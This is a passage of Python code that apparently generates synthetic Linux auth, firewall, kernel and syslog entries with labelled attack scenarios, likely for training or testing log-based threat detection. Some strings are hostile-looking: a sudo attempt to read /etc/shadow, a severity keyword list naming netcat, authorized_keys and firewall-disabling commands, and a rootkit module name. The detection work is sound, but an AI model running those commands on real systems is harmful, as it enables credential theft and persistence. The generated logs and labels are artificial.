            self.add(self.syslog_line(t, "systemd-logind", f"Session {sid} logged out. Waiting for processes to exit.", "auth", pid=r.randint(500, 1500), event="session"))
            self.add(self.syslog_line(t + dt.timedelta(milliseconds=r.randint(5, 900)), "systemd-logind", f"Removed session {sid}.", "auth", pid=r.randint(500, 1500), event="session"))
        elif k == 5:
            self.add(self.syslog_line(t, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {u}(uid={r.randint(1000, 1005)})", "auth", user=u, event="session"))
            self.add(self.syslog_line(t + dt.timedelta(seconds=r.uniform(0.1, 30)), "sudo", "pam_unix(sudo:session): session closed for user root", "auth", event="session"))
        elif k == 6:
            ip = r.choice(self.admin_ips)
            self.add(self.syslog_line(t, "sshd", f"Disconnected from user {u} {ip} port {r.port()}", "auth", pid=pid, ip=ip, user=u, event="disconnect"))
        elif k == 7:
            self.add(self.syslog_line(t, "sudo", f"{u:>8} : a password is required ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/{r.choice(['systemctl status nginx', 'apt update', 'ls /root'])}", "auth", user=u, event="sudo_pw"))
        elif k == 8:
            self.add(self.syslog_line(t, "systemd", f"pam_unix(systemd-user:session): session opened for user {u}(uid={r.randint(1000, 1005)}) by {u}(uid=0)", "auth", pid=pid, user=u, event="session"))
        else:
            self.add(self.syslog_line(t, "polkitd", f"Registered Authentication Agent for unix-process:{pid}:{r.randint(1000000, 9999999)} (system bus name :1.{r.randint(10, 999)} [/usr/bin/pkttyagent --notify-fd 5 --fallback], object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8)", "auth", pid=r.randint(500, 1500)))

    def ssh_fail(self, t, ip, user, invalid, f):
        pid = self.npid()
        port = self.r.port()
        r = self.r
        if invalid:
            self.add(self.syslog_line(t, "sshd", f"Invalid user {user} from {ip} port {port}", "auth", f, pid=pid, user=user, ip=ip, event="invalid"), nc=True)
            if r.random() < 0.3:
                self.add(self.syslog_line(t + dt.timedelta(seconds=1), "sshd", f"pam_unix(sshd:auth): check pass; user unknown", "auth", f, pid=pid), nc=True)
            self.add(self.syslog_line(t + dt.timedelta(seconds=r.uniform(1, 3)), "sshd", f"Failed password for invalid user {user} from {ip} port {port} ssh2", "auth", f,
                                      pid=pid, user=user, ip=ip, event="failed"))
        else:
            if r.random() < 0.3:
                self.add(self.syslog_line(t, "sshd", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={user}", "auth", f, pid=pid, ip=ip, user=user), nc=True)
            self.add(self.syslog_line(t + dt.timedelta(seconds=r.uniform(0.5, 2)), "sshd", f"Failed password for {user} from {ip} port {port} ssh2", "auth", f, pid=pid, user=user, ip=ip, event="failed"))
        if r.random() < 0.15:
            self.add(self.syslog_line(t + dt.timedelta(seconds=3), "sshd", r.choice([f"Connection closed by authenticating user {user} {ip} port {port} [preauth]",
                                                                                    f"Received disconnect from {ip} port {port}:11: Bye Bye [preauth]",
                                                                                    f"Disconnected from authenticating user {user} {ip} port {port} [preauth]"]), "auth", f, pid=pid, ip=ip), nc=True)

    def auth_attack(self, kind, ip=None, user=None):
        r = self.r
        forced_ip, forced_user = ip, user
        if kind == "ssh_brute_force":
            ip = forced_ip or self.new_ip()
            users = [r.choice(["root", "root", "admin", "ubuntu"] + self.users[:1])] if r.random() < 0.6 else r.sample(["root", "admin", "ubuntu"] + self.users, r.randint(2, 3))
            n = r.randint(5, 16)
            f = Finding(kind, "medium", "auth", "attempted", [ip], users)
            for t in self.burst(n, r.choice([30, 120, 600])):
                self.ssh_fail(t, ip, r.choice(users), False, f)
            if r.random() < 0.4:
                t = max(l.t for l in self.lines if l.fid is f) + dt.timedelta(seconds=2)
                pid = self.npid(); pp = r.port()
                self.add(self.syslog_line(t, "sshd", f"error: maximum authentication attempts exceeded for {users[0]} from {ip} port {pp} ssh2 [preauth]", "auth", f, pid=pid, ip=ip, user=users[0], event="maxauth"), nc=True)
                self.add(self.syslog_line(t, "sshd", f"Disconnecting authenticating user {users[0]} {ip} port {pp}: Too many authentication failures [preauth]", "auth", f, pid=pid, ip=ip), nc=True)
                if r.random() < 0.5:
                    self.add(self.syslog_line(t, "sshd", f"PAM {r.randint(2, 5)} more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={users[0]}", "auth", f, pid=pid, ip=ip), nc=True)
            f.extra["fails"] = n
            self.findings.append(f)
            return f
        if kind == "ssh_user_enumeration":
            ip = self.new_ip()
            k = r.randint(4, 9)
            users = r.sample(INVALID_USERS, k)
            f = Finding(kind, "medium", "auth", "attempted", [ip], users)
            for t, u in zip(self.burst(k, r.choice([20, 60, 300])), users):
                self.ssh_fail(t, ip, u, True, f)
            self.findings.append(f)
        elif kind == "distributed_ssh_brute_force":
            ips = [self.new_ip() for _ in range(r.randint(5, 9))]
            users = r.sample(["root", "admin"] + self.users, r.randint(1, 2))
            f = Finding(kind, "high", "auth", "attempted", ips, users)
            for t in self.burst(len(ips) * r.randint(1, 2), 600):
                self.ssh_fail(t, r.choice(ips), r.choice(users), False, f)
            used = []
            for l in self.lines:
                if l.fid is f and l.meta.get("ip") not in used:
                    used.append(l.meta["ip"])
            f.ips = used
            # each ip stays below per-ip threshold → only the aggregate is a finding
            self.findings.append(f)
        elif kind == "compromised_account":
            ip = forced_ip or self.new_ip()
            u = forced_user or r.choice(self.users + ["admin", "ubuntu", "deploy"])
            n = r.randint(5, 14)
            f = Finding(kind, "critical", "auth", "successful", [ip], [u], extra={"fails": n})
            ts = self.burst(n + 1, r.choice([60, 300]))
            for t in ts[:-1]:
                self.ssh_fail(t, ip, u, False, f)
            pid = self.npid()
            self.add(self.syslog_line(ts[-1], "sshd", f"Accepted password for {u} from {ip} port {r.port()} ssh2", "auth", f, pid=pid, user=u, ip=ip, event="accepted"), nc=True)
            self.add(self.syslog_line(ts[-1] + dt.timedelta(milliseconds=40), "sshd", f"pam_unix(sshd:session): session opened for user {u}(uid={r.randint(1000, 1010)}) by {u}(uid=0)", "auth", f, pid=pid, user=u, event="session"), nc=True)
            self.findings.append(f)
        elif kind == "root_login":
            ip = self.new_ip()
            f = Finding(kind, "high", "auth", "successful", [ip], ["root"])
            t = self.rt()
            pid = self.npid()
            self.add(self.syslog_line(t, "sshd", f"Accepted {r.choice(['password', 'publickey'])} for root from {ip} port {r.port()} ssh2", "auth", f, pid=pid, user="root", ip=ip, event="accepted"))
            self.add(self.syslog_line(t + dt.timedelta(milliseconds=50), "sshd", "pam_unix(sshd:session): session opened for user root(uid=0) by root(uid=0)", "auth", f, pid=pid, user="root", event="session"), nc=True)
            self.findings.append(f)
        elif kind == "privilege_escalation_attempt":
            u = forced_user or r.choice(["www-data", "git", "postgres", "jenkins"] + self.users[2:])
            n = r.randint(1, 3)
            f = Finding(kind, "high", "auth", "blocked", [], [u])
            for t in self.burst(n, 120):
                cmd = r.choice(["/bin/bash", "/usr/bin/su", "/bin/cat /etc/shadow", "/usr/bin/id"])
                self.add(self.syslog_line(t, "sudo", f"{u:>8} : user NOT in sudoers ; TTY=pts/{r.randint(0, 4)} ; PWD=/tmp ; USER=root ; COMMAND={cmd}", "auth", f, user=u, event="sudo_denied", cmd=cmd))
            self.findings.append(f)
        elif kind == "sudo_auth_failure":
            u = r.choice(self.users)
            n = r.randint(3, 5)
            f = Finding(kind, "low" if n < 3 else "medium", "auth", "attempted", [], [u])
            for t in self.burst(n, 60):
                self.add(self.syslog_line(t, "sudo", f"pam_unix(sudo:auth): authentication failure; logname={u} uid={self.uid.get(u, 1000)} euid=0 tty=/dev/pts/{r.randint(0, 3)} ruser={u} rhost=  user={u}", "auth", f, user=u, event="sudo_fail"))
            if r.random() < 0.5:
                t = max(l.t for l in self.lines if l.fid is f) + dt.timedelta(seconds=1)
                self.add(self.syslog_line(t, "sudo", f"{u:>8} : {n} incorrect password attempts ; TTY=pts/1 ; PWD=/home/{u} ; USER=root ; COMMAND=/bin/bash", "auth", f, user=u, event="sudo_fail"), nc=True)
            self.findings.append(f)
        elif kind == "suspicious_sudo_command":
            u = forced_user or r.choice(self.users)
            cmds = [c.format(ip=r.pub_ip()) for c in r.sample(SUSP_SUDO, r.randint(1, 2))]
            f = Finding(kind, "critical" if any(k in " ".join(cmds) for k in ("bash", "useradd", "4755", "nc ", "authorized_keys", "kworker", "ufw disable", "iptables -F", "disable --now ufw")) else "high",
                        "auth", "successful", [], [u], extra={"cmd": "; ".join(cmds)})
            for t, cmd in zip(self.burst(len(cmds), 120), cmds):
                self.add(self.syslog_line(t, "sudo", f"{u:>8} : TTY=pts/{r.randint(0, 4)} ; PWD=/tmp ; USER=root ; COMMAND={cmd}", "auth", f, user=u, event="sudo", cmd=cmd))
            self.findings.append(f)
        elif kind == "account_created":
            nu = r.choice(["sysupd", "backup2", "support", "test", "mysqld", "dbus-user", "admin2", "newdev", "intern"])
            uid0 = r.random() < 0.3
            sudo = r.random() < 0.4
            f = Finding(kind, "critical" if uid0 else "high" if sudo else "medium", "auth", "successful", [], [nu], extra={"uid0": uid0, "sudo": sudo})
            t = self.rt()
            uid = 0 if uid0 else r.randint(1001, 1020)
            self.add(self.syslog_line(t, "useradd", f"new group: name={nu}, GID={uid if uid else 1050}", "auth", f, pid=self.npid(), user=nu, event="useradd"), nc=True)
            self.add(self.syslog_line(t + dt.timedelta(milliseconds=5), "useradd", f"new user: name={nu}, UID={uid}, GID={uid if uid else 1050}, home=/home/{nu}, shell=/bin/bash, from=/dev/pts/{r.randint(0, 3)}", "auth", f, pid=self.npid(), user=nu, event="useradd"))
            if sudo:
                self.add(self.syslog_line(t + dt.timedelta(seconds=r.randint(3, 40)), "usermod", f"add '{nu}' to group 'sudo'", "auth", f, pid=self.npid(), user=nu, event="usermod"), nc=True)
            self.findings.append(f)
        elif kind == "unusual_login":
            u = r.choice(self.users)
            ip = self.new_ip()
            t = self.t0.replace(hour=r.choice([2, 3, 4]), minute=r.randint(0, 59))
            f = Finding(kind, "low", "auth", "successful", [ip], [u], extra={"when": f"{t:%H:%M}"})
            pid = self.npid()
            self.add(self.syslog_line(t, "sshd", f"Accepted password for {u} from {ip} port {r.port()} ssh2", "auth", f, pid=pid, user=u, ip=ip, event="accepted"))
            self.findings.append(f)
        elif kind == "ssh_scan":
            ip = self.new_ip()
            n = r.randint(3, 8)
            f = Finding(kind, "low", "auth", "attempted", [ip])
            for t in self.burst(n, r.choice([5, 60, 600])):
                pp = r.port()
                self.add(self.syslog_line(t, "sshd", r.choice([f"kex_exchange_identification: read: Connection reset by peer",
                                                              f"Unable to negotiate with {ip} port {pp}: no matching key exchange method found. Their offer: diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 [preauth]",
                                                              f"banner exchange: Connection from {ip} port {pp}: invalid format",
                                                              f"error: kex_exchange_identification: Connection closed by remote host",
                                                              f"Connection reset by {ip} port {pp} [preauth]",
                                                              f"Unable to negotiate with {ip} port {pp}: no matching host key type found. Their offer: ssh-rsa,ssh-dss [preauth]"]),
                                          "auth", f, pid=self.npid(), ip=ip, event="scan"))
            # lines without the IP need a companion "Connection from" line for attribution
            for l in [l for l in self.lines if l.fid is f and ip not in l.text]:
                l.text = l.text.replace("kex_exchange_identification:", f"Connection from {ip} port {r.port()}: kex_exchange_identification:", 1) if "error:" not in l.text else l.text.replace("Connection closed by remote host", f"Connection closed by remote host {ip} port {r.port()}")
            self.findings.append(f)
        elif kind == "fail2ban_ban":
            pass

    # ---------------- ufw
    def ufw_line(self, t, action, src_ip, dst_port, proto="TCP", f=None):
        r = self.r
        mac = self.mac
        flags = "SYN URGP=0" if proto == "TCP" else ""
        body = (f"[UFW {action}] IN={self.iface} OUT= MAC={mac} SRC={src_ip} DST={self.server_ip} LEN={r.choice([40, 44, 52, 60])} "
                f"TOS=0x00 PREC=0x00 TTL={r.randint(30, 250)} ID={r.randint(1, 65535)} " + ("DF " if r.random() < 0.3 else "") +
                f"PROTO={proto} SPT={r.port()} DPT={dst_port} " + (f"WINDOW={r.choice([1024, 65535, 29200])} RES=0x00 {flags}" if proto == "TCP" else f"LEN={r.randint(8, 120)}"))
        if self.syslog_kind == "iso" or r.random() < 0.5:
            up = (t - self.boot).total_seconds()
            body = f"[{up:12.6f}] {body}" if r.random() < 0.5 else body
        return self.syslog_line(t, "kernel", body, "ufw", f, ip=src_ip, port=dst_port, action=action, proto=proto)

    def ufw_line_raw(self, t, src_ip, dst_ip, spt, dpt, proto, f=None):
        r = self.r
        mac = self.mac if dst_ip[:3] not in ("224", "239", "255") else ("01:00:5e:00:00:fb:" if dst_ip.startswith("224") else "ff:ff:ff:ff:ff:ff:") + self.mac[18:]
        if proto == "2":
            body = f"[UFW BLOCK] IN={self.iface} OUT= MAC={mac} SRC={src_ip} DST={dst_ip} LEN=32 TOS=0x00 PREC=0xC0 TTL=1 ID=0 DF PROTO=2"
        else:
            body = (f"[UFW BLOCK] IN={self.iface} OUT= MAC={mac} SRC={src_ip} DST={dst_ip} LEN={r.randint(40, 1300)} TOS=0x00 PREC=0x00 TTL={r.randint(1, 120)} ID={r.choice([0, r.randint(1, 65535)])} "
                    + ("DF " if r.random() < 0.6 else "") + f"PROTO={proto} SPT={spt} DPT={dpt} " + (f"LEN={r.randint(20, 1280)}" if proto == "UDP" else f"WINDOW={r.randint(100, 65535)} RES=0x00 ACK {r.choice(['', 'PSH ', 'FIN '])}URGP=0"))
        return self.syslog_line(t, "kernel", body, "ufw", f, ip=src_ip, port=dpt, action="BLOCK", proto=proto)

    def ufw_benign_blocks(self, k):
        """Harmless blocked packets that must NOT be reported: late QUIC/TLS/DNS replies, multicast, broadcast."""
        r = self.r
        kind = r.choice(["quic", "quic", "tls", "dns", "mdns", "ssdp", "igmp", "dhcp", "netbios"])
        lan = self.server_ip if self.server_ip.startswith(("192.168", "10.", "172.")) else r.priv_ip()
        if kind in ("quic", "tls", "dns"):
            src = self.new_ip()
            spt = {"quic": 443, "tls": 443, "dns": 53}[kind]
            for t in self.burst(k, r.choice([60, 600, 3600])):
                self.add(self.ufw_line_raw(t, src, self.server_ip, spt, r.randint(32768, 65535), "UDP" if kind != "tls" else "TCP"))
        else:
            src = r.choice([r.priv_ip(), r.priv_ip(), "0.0.0.0"]) if kind == "dhcp" else lan.rsplit(".", 1)[0] + f".{r.randint(1, 254)}"
            dst, spt, dpt, proto = {"mdns": ("224.0.0.251", 5353, 5353, "UDP"), "ssdp": ("239.255.255.250", r.port(), 1900, "UDP"),
                                    "igmp": ("224.0.0.22", 0, 0, "2"), "dhcp": ("255.255.255.255", 68, 67, "UDP"),
                                    "netbios": (lan.rsplit(".", 1)[0] + ".255", 137, 137, "UDP")}[kind]
            for t in self.burst(k, r.choice([60, 600, 3600])):
                self.add(self.ufw_line_raw(t, src, dst, spt, dpt, proto))

    def ufw_noise(self, n):
        r = self.r
        if r.random() < 0.6:
            self.ufw_benign_blocks(r.randint(2, 12))
        for _ in range(n):
            t = self.rt()
            if r.random() < 0.3:
                self.add(self.ufw_line(t, "ALLOW", r.choice(self.admin_ips), r.choice([22, 80, 443])))
            else:
                # internet background: one-off blocked packets from distinct IPs (not a finding)
                self.add(self.ufw_line(t, "BLOCK", self.new_ip(), r.choice([23, 445, 3389, 8080, 5900, 1433, 6379, 2323, 8443, 81, 5555, 123, 53]),
                                       proto=r.choice(["TCP", "TCP", "UDP"])))

    def ufw_attack(self, kind, ip=None):
        r = self.r
        ip = ip or self.new_ip()
        if kind == "port_scan":
            k = r.randint(6, 20)
            ports = sorted(r.sample([21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900,
                                     6379, 8000, 8080, 8443, 8888, 9000, 9200, 11211, 27017], k))
            f = Finding(kind, "low", "ufw", "blocked", [ip], extra={"ports": ports})
            for t, p in zip(self.burst(k, r.choice([2, 10, 60])), r.sample(ports, k)):
                self.add(self.ufw_line(t, "BLOCK", ip, p), f)
            self.findings.append(f)
        elif kind == "repeated_blocked_connections":
            port = r.choice([22, 3306, 5432, 6379, 3389, 27017, 9200, 2375])
            n = r.randint(5, 14)
            f = Finding(kind, "medium" if port in (3306, 5432, 6379, 27017, 9200, 2375) else "low", "ufw", "blocked", [ip], extra={"port": port, "proto": "TCP"})
            for t in self.burst(n, r.choice([30, 300])):
                self.add(self.ufw_line(t, "BLOCK", ip, port), f)
            self.findings.append(f)
        elif kind == "firewall_disabled":
            f = Finding(kind, "high", "ufw", "successful", [])
            t = self.rt()
            self.add(self.syslog_line(t, "systemd", "Stopping ufw.service - Uncomplicated firewall...", "ufw", f, pid=1, event="ufw_stop"))
            self.add(self.syslog_line(t + dt.timedelta(seconds=1), "systemd", "ufw.service: Deactivated successfully.", "ufw", f, pid=1, event="ufw_stop"), nc=True)
            self.findings.append(f)

    # ---------------- dmesg / kernel
    def dmesg_line(self, t, msg, f=None, **meta):
        if self.dmesg_kind in ("uptime", "uptime_kernel"):
            up = (t - self.boot).total_seconds()
            ts = f"{up:.6f}"
            text = f"[{up:12.6f}] " + ("kernel: " if self.dmesg_kind == "uptime_kernel" else "") + msg
        else:
            ts = ts_fmt(t, "dmesg_T")
            text = f"[{ts}] {msg}"
        return Line(t, text, "dmesg", ts, f, **meta)

    def dmesg_noise(self, n):
        r = self.r
        if r.random() < 0.3:
            # kernel ring buffer often contains UFW lines too (benign background only)
            for _ in range(r.randint(1, 6)):
                t = self.rt()
                l = self.ufw_line(t, "BLOCK", self.new_ip(), r.choice([23, 445, 3389, 8080, 5900, 6379, 2323, 81, 5555]), proto=r.choice(["TCP", "UDP"]))
                body = l.text.split("kernel: ", 1)[1]
                body = body.split("] ", 1)[1] if body.startswith("[") and not body.startswith("[UFW") else body
                d = self.dmesg_line(t, body); d.meta.update(l.meta); d.src = "dmesg"
                self.add(d)
        for _ in range(n):
            msg = r.choice(DMESG_BOOT + DMESG_EXTRA).format(k=r.randint(30, 60), a=r.randint(1, 9), b=r.randint(30, 60), t=f"{r.randint(1700000000, 1800000000)}.{r.randint(100, 999)}", p=r.randint(500, 3000))
            self.add(self.dmesg_line(self.rt(), msg))

    def dmesg_attack(self, kind):
        r = self.r
        if kind == "oom_kill":
            proc = r.choice(PROCS)
            pid = r.randint(1000, 300000)
            f = Finding(kind, "high", "dmesg", "observed", extra={"proc": proc, "pid": pid})
            t = self.rt()
            rss = r.randint(2_000_000, 30_000_000)
            for i, m in enumerate([
                f"{r.choice(PROCS)} invoked oom-killer: gfp_mask=0x140cca(GFP_HIGHUSER_MOVABLE|__GFP_COMP), order=0, oom_score_adj=0",
                f"Out of memory: Killed process {pid} ({proc}) total-vm:{rss + r.randint(1000, 900000)}kB, anon-rss:{rss}kB, file-rss:{r.randint(0, 9000)}kB, shmem-rss:0kB, UID:{r.choice([0, 33, 1000, 999])} pgtables:{r.randint(1000, 90000)}kB oom_score_adj:0",
                f"oom_reaper: reaped process {pid} ({proc}), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB"]):
                self.add(self.dmesg_line(t + dt.timedelta(milliseconds=i * 3), m, f), nc=(i != 1))
            self.findings.append(f)
        elif kind == "segfault":
            proc = r.choice(PROCS)
            n = r.randint(1, 3)
            f = Finding(kind, "medium" if n == 1 else "high", "dmesg", "observed", extra={"proc": proc})
            for t in self.burst(n, 600):
                pid = r.randint(1000, 300000)
                lib = r.choice(["libc.so.6", "libphp.so", "libcuda.so.1", proc, "libssl.so.3"])
                self.add(self.dmesg_line(t, f"{proc}[{pid}]: segfault at {r.getrandbits(40):x} ip {r.getrandbits(47):016x} sp {r.getrandbits(47):016x} error {r.choice([4, 6, 14, 15])} in {lib}[{r.getrandbits(44):x}+{r.getrandbits(20):x}] likely on CPU {r.randint(0, 31)} (core {r.randint(0, 15)}, socket 0)", f))
            self.findings.append(f)
        elif kind == "disk_error":
            dev = r.choice(["sda", "sdb", "nvme0n1", "sdc"])
            f = Finding(kind, "high", "dmesg", "observed", extra={"dev": dev})
            t = self.rt()
            sector = r.randint(1000000, 900000000)
            msgs = r.choice([
                [f"ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0", f"ata1.00: failed command: READ FPDMA QUEUED",
                 f"sd 0:0:0:0: [{dev}] tag#{r.randint(0, 31)} FAILED Result: hostbyte=DID_OK driverbyte=DRIVER_OK cmd_age=0s",
                 f"sd 0:0:0:0: [{dev}] tag#{r.randint(0, 31)} Sense Key : Medium Error [current]",
                 f"I/O error, dev {dev}, sector {sector} op 0x0:(READ) flags 0x0 phys_seg 1 prio class 2"],
                [f"blk_update_request: I/O error, dev {dev}, sector {sector} op 0x1:(WRITE) flags 0x800 phys_seg 1 prio class 0",
                 f"Buffer I/O error on dev {dev}1, logical block {sector // 8}, lost async page write",
                 f"EXT4-fs error (device {dev}1): ext4_find_entry:1678: inode #{r.randint(2, 900000)}: comm {r.choice(PROCS)}: reading directory lblock 0",
                 f"EXT4-fs ({dev}1): Remounting filesystem read-only"],
                [f"nvme nvme0: I/O {r.randint(0, 999)} QID {r.randint(1, 16)} timeout, aborting", f"nvme nvme0: Abort status: 0x0",
                 f"nvme nvme0: I/O {r.randint(0, 999)} QID {r.randint(1, 16)} timeout, reset controller", f"nvme0n1: I/O Cmd(0x2) @ LBA {sector}, 8 blocks, I/O Error (sct 0x2 / sc 0x81) DNR"]])
            if "Remounting filesystem read-only" in " ".join(msgs):
                f.severity = "critical"
            for i, m in enumerate(msgs):
                self.add(self.dmesg_line(t + dt.timedelta(milliseconds=i * 7), m, f))
            self.findings.append(f)
        elif kind == "hardware_error":
            kind2, msgs = r.choice([
                ("machine check", [f"mce: [Hardware Error]: Machine check events logged", f"mce: [Hardware Error]: CPU {r.randint(0, 31)}: Machine Check: 0 Bank 5: be00000000800400",
                                   f"mce: [Hardware Error]: TSC 0 ADDR {r.getrandbits(36):x} MISC 0 "]),
                ("corrected memory error", [f"EDAC MC0: 1 CE memory read error on CPU_SrcID#0_Ha#0_Chan#1_DIMM#0 (channel:1 slot:0 page:0x{r.getrandbits(20):x} offset:0x0 grain:32 syndrome:0x0)"]),
                ("CPU overheating", [f"CPU{r.randint(0, 31)}: Core temperature above threshold, cpu clock throttled (total events = {r.randint(1, 9000)})",
                                     f"CPU{r.randint(0, 31)}: Package temperature above threshold, cpu clock throttled (total events = {r.randint(1, 9000)})"]),
                ("PCIe AER error", [f"pcieport 0000:00:01.0: AER: Corrected error message received from 0000:01:00.0",
                                    f"nvidia 0000:01:00.0: PCIe Bus Error: severity=Corrected, type=Physical Layer, (Receiver ID)"])])
            f = Finding("hardware_error", "medium" if "Corrected" in " ".join(msgs) or "temperature" in " ".join(msgs) else "high", "dmesg", "observed", extra={"kind": kind2})
            t = self.rt()
            for i, m in enumerate(msgs):
                self.add(self.dmesg_line(t + dt.timedelta(milliseconds=i * 2), m, f))
            self.findings.append(f)
        elif kind == "kernel_oops":
            kind2 = r.choice(["general protection fault", "NULL pointer dereference", "soft lockup", "kernel BUG"])
            f = Finding(kind, "high", "dmesg", "observed", extra={"kind": kind2})
            t = self.rt()
            cpu = r.randint(0, 31)
            head = {"general protection fault": f"general protection fault, probably for non-canonical address 0x{r.getrandbits(60):x}: 0000 [#1] PREEMPT SMP NOPTI",
                    "NULL pointer dereference": f"BUG: kernel NULL pointer dereference, address: 00000000000000{r.randint(10, 99)}",
                    "soft lockup": f"watchdog: BUG: soft lockup - CPU#{cpu} stuck for {r.randint(22, 90)}s! [{r.choice(PROCS)}:{r.randint(1000, 90000)}]",
                    "kernel BUG": f"kernel BUG at mm/slub.c:{r.randint(300, 4000)}!"}[kind2]
            msgs = [head, f"CPU: {cpu} PID: {r.randint(1, 90000)} Comm: {r.choice(PROCS)} Tainted: G           O       6.8.0-{r.randint(30, 60)}-generic",
                    f"RIP: 0010:{r.choice(['__list_del_entry_valid', 'kmem_cache_alloc', 'nf_nat_setup_info', 'nvkm_mem_new', 'tcp_v4_rcv'])}+0x{r.getrandbits(8):x}/0x{r.getrandbits(10):x}",
                    "Call Trace:", " <TASK>"]
            for i, m in enumerate(msgs):
                self.add(self.dmesg_line(t + dt.timedelta(microseconds=i * 40), m, f), nc=(i != 0))
            self.findings.append(f)
        elif kind == "syn_flood":
            port = r.choice([80, 443, 22, 8080])
            f = Finding(kind, "high", "dmesg", "observed", extra={"port": port})
            for t in self.burst(r.randint(1, 3), 300):
                self.add(self.dmesg_line(t, f"TCP: request_sock_TCP: Possible SYN flooding on port {r.choice(['', '0.0.0.0:', '[::]:'])}{port}. Sending cookies.  Check SNMP counters.", f))
            self.findings.append(f)
        elif kind == "conntrack_full":
            f = Finding(kind, "high", "dmesg", "observed")
            for t in self.burst(r.randint(2, 5), 30):
                self.add(self.dmesg_line(t, "nf_conntrack: nf_conntrack: table full, dropping packet", f))
            self.findings.append(f)
        elif kind == "unsigned_module":
            mod = r.choice(["diamorphine", "nvidia", "vboxdrv", "zfs", "rtl8812au", "kdev_x", "hid_cyber", "wireguard_ext"])
            susp = mod in ("diamorphine", "kdev_x", "hid_cyber")
            f = Finding(kind, "high" if susp else "low", "dmesg", "observed", extra={"mod": mod})
            t = self.rt()
            self.add(self.dmesg_line(t, f"{mod}: loading out-of-tree module taints kernel.", f))
            self.add(self.dmesg_line(t + dt.timedelta(milliseconds=1), f"{mod}: module verification failed: signature and/or required key missing - tainting kernel", f), nc=True)
            self.findings.append(f)
        elif kind == "apparmor_denied":
            proc = r.choice(["nginx", "mysqld", "php-fpm8.3", "cupsd", "snap-confine", "named"])
            target = r.choice(["/etc/shadow", "/root/.ssh/", "/tmp/.x/payload", "/proc/1/environ", "/usr/bin/bash", "/etc/passwd"])
            n = r.randint(1, 4)
            f = Finding(kind, "high" if target in ("/etc/shadow", "/root/.ssh/", "/usr/bin/bash", "/tmp/.x/payload") else "medium", "dmesg", "blocked", extra={"proc": proc, "target": target})
            for t in self.burst(n, 60):
                self.add(self.dmesg_line(t, f'audit: type=1400 audit({r.randint(1700000000, 1800000000)}.{r.randint(100, 999)}:{r.randint(10, 9999)}): apparmor="DENIED" operation="{r.choice(["open", "exec", "file_mmap"])}" class="file" profile="{proc}" name="{target}" pid={r.randint(500, 90000)} comm="{proc[:15]}" requested_mask="{r.choice(["r", "x", "rw"])}" denied_mask="{r.choice(["r", "x"])}" fsuid={r.choice([0, 33, 112])} ouid=0', f))
            self.findings.append(f)
        elif kind == "usb_device":
            vend = r.choice([("SanDisk", "Ultra"), ("Kingston", "DataTraveler 3.0"), ("Generic", "Mass Storage"), ("WD", "My Passport 25E2")])
            dev = f"{vend[0]} {vend[1]}"
            f = Finding(kind, "low", "dmesg", "observed", extra={"dev": dev})
            t = self.rt()
            b = r.randint(1, 4)
            sd = r.choice(["sdb", "sdc", "sdd"])
            for i, m in enumerate([f"usb {b}-{r.randint(1, 6)}: new high-speed USB device number {r.randint(2, 20)} using xhci_hcd",
                                   f"usb {b}-1: Product: {vend[1]}", f"usb {b}-1: Manufacturer: {vend[0]}",
                                   f"usb-storage {b}-1:1.0: USB Mass Storage device detected",
                                   f"sd 6:0:0:0: [{sd}] {r.randint(15000000, 2000000000)} 512-byte logical blocks: (32.0 GB/29.8 GiB)",
                                   f" {sd}: {sd}1"]):
                self.add(self.dmesg_line(t + dt.timedelta(milliseconds=i * 120), m, f), nc=(i != 3))
            self.findings.append(f)

    # ---------------- syslog (systemd, cron, fail2ban)
    def syslog_noise(self, n):
        r = self.r
        for _ in range(r.randint(0, max(1, n // 2))):
            t = self.rt()
            unit, desc = r.choice([("sysstat-collect.service", "system activity accounting tool"), ("phpsessionclean.service", "Clean php session files"),
                                   ("fwupd-refresh.service", "Refresh fwupd metadata and update motd"), ("motd-news.service", "Message of the Day"),
                                   ("apt-daily.service", "Daily apt download activities"), ("apt-daily-upgrade.service", "Daily apt upgrade and clean activities"),
                                   ("man-db.service", "Daily man-db regeneration"), ("systemd-tmpfiles-clean.service", "Cleanup of Temporary Directories"),
                                   ("logrotate.service", "Rotate log files"), ("e2scrub_all.service", "Online ext4 Metadata Check for All Filesystems")])
            for i, m in enumerate([f"Starting {unit} - {desc}...", f"{unit}: Deactivated successfully.", f"Finished {unit} - {desc}."]):
                self.add(self.syslog_line(t + dt.timedelta(milliseconds=i * r.randint(5, 400)), "systemd", m, "syslog", pid=1))
        for _ in range(r.randint(0, 3)):
            t = self.rt()
            m = r.choice([
                ("smartd", f"Device: /dev/{r.choice(['sda', 'sdb'])} [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from {r.randint(30, 45)} to {r.randint(30, 45)}"),
                ("smartd", f"Device: /dev/nvme0, SMART Health Status: OK"), ("fstrim", f"/: {r.uniform(1, 90):.1f} GiB ({r.randint(10**9, 10**11)} bytes) trimmed on /dev/mapper/ubuntu--vg-ubuntu--lv"),
                ("dbus-daemon", "[system] Successfully activated service 'org.freedesktop.PackageKit'"), ("PackageKit", "daemon start"),
                ("NetworkManager", f"<info>  [{r.randint(1700000000, 1800000000)}.{r.randint(1000, 9999)}] dhcp4 ({self.iface}): state changed new lease, address={r.priv_ip()}"),
                ("50-motd-news", " * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s"), ("fwupdmgr", "Updating lvfs"),
                ("hostapd", "wlan0: STA 3c:84:6a:12:9b:01 IEEE 802.11: associated"), ("systemd", f"Started session-{r.randint(1, 900)}.scope - Session {r.randint(1, 900)} of User {r.choice(self.users)}."),
                ("kernel", f"[{r.uniform(10, 900000):12.6f}] perf: interrupt took too long ({r.randint(2500, 9000)} > {r.randint(2500, 9000)}), lowering kernel.perf_event_max_sample_rate to {r.randint(20000, 79000)}")])
            self.add(self.syslog_line(t, m[0], m[1], "syslog", pid=r.randint(300, 9000) if m[0] not in ("kernel",) else None))
